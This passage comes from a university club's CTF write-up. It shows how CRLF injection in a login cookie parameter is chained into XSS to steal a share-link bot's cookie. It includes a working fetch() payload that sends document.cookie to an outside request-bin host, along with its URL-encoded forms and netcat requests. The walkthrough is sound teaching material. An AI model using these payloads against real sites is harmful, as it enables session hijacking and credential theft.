this site!&lt;form action=&quot;/share&quot; method=&quot;get&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;link&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;script&gt;document.getElementById(&#39;username&#39;).innerHTML = document.cookie.split(&#39;;&#39;).find(x =&gt; x.includes(&#39;username=&#39;)).split(&#39;username=&#39;)[1]&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div>\n<p>We see that when we visit the dashboard page, a cookie named <code>\"secret\"</code> is set. This essentially confirms that the challenge is XSS based. Submitting a link that points to a server that we control (or a <a href=\"requestbin.com/\">request bin</a>) into the share link field will confirm that this feature in the website causes someone (presumably a browser who has the flag in their <code>\"secret\"</code> cookie) to visit the link.</p>\n<p>Our goal then becomes to find an XSS vulnerability somewhere in the website. Something interesting to note is that there are no POST requests, and in fact, other than the share link feature, the only other place where the website takes user input is when we log in, so we direct our attention there.</p>\n<p>If we take a look at the request again, we notice that a <code>\"username\"</code> cookie is being set whose value is equal to our input. Whenever we see the server using user supplied input, it is always a good idea to test if it is properly sanitised. If we try supplying <code>\"hello%20a\"</code> as our username in the path, we see that the response <code>Set-Cookie</code> header sets the <code>\"username\"</code> cookie to <code>\"hello a\"</code>:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc -C ws-chall.umisc.info 2001\nGET /login?username=hello%20a HTTP/1.1\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: username=hello a; path=/;\nServer: HTTP Server 3000\nConnection: closed\n\n&lt;html&gt;Thanks for logging in! Click &lt;a href=&quot;/dashboard&quot;&gt;here&lt;/a&gt; to go to your dashboard...&lt;/html&gt;</code></pre></div>\n<p>This tell us that the server is taking our username input, <a href=\"https://en.wikipedia.org/wiki/Percent-encoding\">URL decoding</a> it, and setting that as the cookie. What would happen if we tried to send the URL encodings of <code>\\r\\n</code> (CRLF)?</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc -C ws-chall.umisc.info 2001\nGET /login?username=hello%0A%0D HTTP/1.1\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nSet-Cookie: username=hello\n; path=/;\nServer: HTTP Server 3000\nConnection: closed\n\n&lt;html&gt;Thanks for logging in! Click &lt;a href=&quot;/dashboard&quot;&gt;here&lt;/a&gt; to go to your dashboard...&lt;/html&gt;</code></pre></div>\n<p>We see that the <code>\"; path=/;\"</code> part of the <code>Set-Cookie</code> header has been moved to the next line! Now, if we send another CLRF, a normal browser would interpret the remainder of the response as the actual response body. This gives us the freedom to create whatever response we want. Since this is all done through a GET request via the url query parameter, we can submit this as a link to share. All that's left is to create an XSS payload to grab the visitor's cookie.</p>\n<p>The following payload will work:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">\\r\\n\\r\\n&lt;script&gt;fetch(&#39;https://enp7ii7txpbn.x.pipedream.net/&#39;+document.cookie)&lt;/script&gt;</code></pre></div>\n<p>URL encoded:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">%0D%0A%0D%0A%3Cscript%3Efetch(&#39;https%3A%2F%2Fenp7ii7txpbn.x.pipedream.net%2F&#39;%2Bdocument.cookie)%3C%2Fscript%3E</code></pre></div>\n<p>Since the link sharing feature will URL decode our input before visiting it, we'll have to send our link URL encoded. Furthermore, since the login page will URL decode the username query parameter when setting the cookie, in order for our payload to work on the visitor's browser, we must URL encode the username section again.</p>\n<p>If we submit the link through the form on a browser we'd only need to URL encode it ourselves once, since the browser will automatically URL encode it when submitting. However, if we use a tool like <a href=\"https://linux.die.net/man/1/nc\">netcat</a>, we'd have to do both URL encodings ourself.</p>\n<p>The link sharing path is <code>/share?link=</code>, so to get the visitor to visit our website and steal their cookie, we would send a GET request to the path:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">/share?link=http%3A%2F%2Fws-chall.umisc.info%3A2001%2Flogin%3Fusername%3D%250D%250A%250D%250A%253Cscript%253Efetch(&#39;https%253A%252F%252Fenp7ii7txpbn.x.pipedream.net%252F&#39;%252Bdocument.cookie)%253C%252Fscript%253E</code></pre></div>\n<p>Using netcat:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">$ nc -C ws-chall.umisc.info 2001\nGET /share?link=http%3A%2F%2Fws-chall.umisc.info%3A2001%2Flogin%3Fusername%3D%250D%250A%250D%250A%253Cscript%253Efetch(&#39;https%253A%252F%252Fenp7ii7txpbn.x.pipedream.net%252F&#39;%252Bdocument.cookie)%253C%252Fscript%253E HTTP/1.1\n\nHTTP/1.1 200 OK\nServer: HTTP Server 3000\nConnection: closed\n\nHopefully people like your link!</code></pre></div>\n<p>Shortly after, we see a request to our request bin with the flag:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;\"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/a4f86ec49f1a3e7b5b52d793d4272229/2b2c6/requestbin-flag.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABUElEQVQoz21Sa2+DMAzk//+8adKmSV3LeJRXSxJISiBwO6el64dZMg6247szJGXd4Uzv9YBhdNDDCG0eLufBxlieM6Q/B6TZN/LihCw/ojjnOKU5cxJZzwokMsSMI2yY4L2H0hp930MpBU231sIYyV2jN22NrmvRMkrPsiwIYcE8z5j8jMS6GzxflDZkaFlcsa53l+Zp8rG+LIGAM88csP71bNsGPpjb4HxAMrNBCh+fBzQNWSiDJQSICVhPIAEzBHO3iSx87P/PJJ8IqtgpLSjJPJHFRsot6xZl1XBfNXfdoqhqZEUFw72auOMhAmozYKai50CR5twUZUUZD4YFh9XtBddex5XIEIlSG62LUZjLvRAZimTu7XjM8Pb+xS9YPyVY5zisgyL6flFyct4Zutt9sMTwKrlpLqj4++zsxKSp6ciOe90v7qxez+IiV1b1C/hRaOWki7WDAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"requestbin-flag.png\"\n        title=\"requestbin-flag.png\"\n        src=\"/static/a4f86ec49f1a3e7b5b52d793d4272229/0a47e/requestbin-flag.png\"\n        srcset=\"/static/a4f86ec49f1a3e7b5b52d793d4272229/8a4e8/requestbin-flag.png 150w,\n/static/a4f86ec49f1a3e7b5b52d793d4272229/5a46d/requestbin-flag.png 300w,\n/static/a4f86ec49f1a3e7b5b52d793d4272229/0a47e/requestbin-flag.png 600w,\n/static/a4f86ec49f1a3e7b5b52d793d4272229/2b2c6/requestbin-flag.png 869w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Flag: <code>MISCCTF{http_server_3000_1s_v3ry_b4d}</code></p>","frontmatter":{"date":"March 11, 2020","path":"/post/2020-03-11-workshop-02-ctf-writeups","title":"Workshop 02 CTF Writeups","author":"Joseph Surin"}}},"pageContext":{"prev":null,"next":{"fileAbsolutePath":"/Users/Trist/misc-website/src/posts/2020-03-05-workshop-01-ctf-writeups/index.md","frontmatter":{"title":"Workshop 01 CTF Writeups","path":"/post/2020-03-05-workshop-01-ctf-writeups"}}}}}